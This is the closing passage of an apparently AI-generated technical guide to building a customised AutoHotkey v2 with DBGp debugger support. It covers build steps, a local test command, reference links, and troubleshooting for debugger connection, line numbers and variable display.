   - File: `source/config.h:28-29`

4. **Add custom modifications:**
   - Edit `source/Debugger.cpp` for custom commands
   - Edit `source/Debugger.h` for new data structures
   - Edit `source/script.cpp` for execution hooks

5. **Build:**
   ```
   Configuration: Release
   Platform: x64 (or Win32)
   Build → Build Solution
   ```

6. **Output:**
   ```
   bin/AutoHotkeyU64.exe
   ```

7. **Test:**
   ```bash
   bin/AutoHotkeyU64.exe /Debug test_script.ahk

   # In another terminal:
   python debugger_client.py
   ```

---

## References

- **DBGp Protocol Spec:** https://xdebug.org/docs/dbgp
- **AutoHotkey v2 Docs:** https://www.autohotkey.com/docs/v2/
- **Debugger Source:** `/home/user/AutoHotkey/source/Debugger.cpp`
- **Hook Source:** `/home/user/AutoHotkey/source/hook.cpp`
- **Script Engine:** `/home/user/AutoHotkey/source/script.cpp`

---

## Troubleshooting

### Issue: Debugger won't connect

**Solution:**
```bash
# Check if port 9000 is available
netstat -an | grep 9000

# Try different port
AutoHotkey.exe /Debug=localhost:9001 script.ahk

# Check firewall
# Allow AutoHotkey.exe in Windows Firewall
```

### Issue: Missing line numbers in stack trace

**Cause:** Script compiled without debug info
**Solution:** Use uncompiled .ahk script with AutoHotkey.exe

### Issue: Variables show as "<error>"

**Cause:** Variable out of scope or optimized away
**Solution:** Check stack depth, ensure variable is in current scope

---

**Document Version:** 1.0
**Last Updated:** 2025-10-23
**Author:** Claude Code Review System
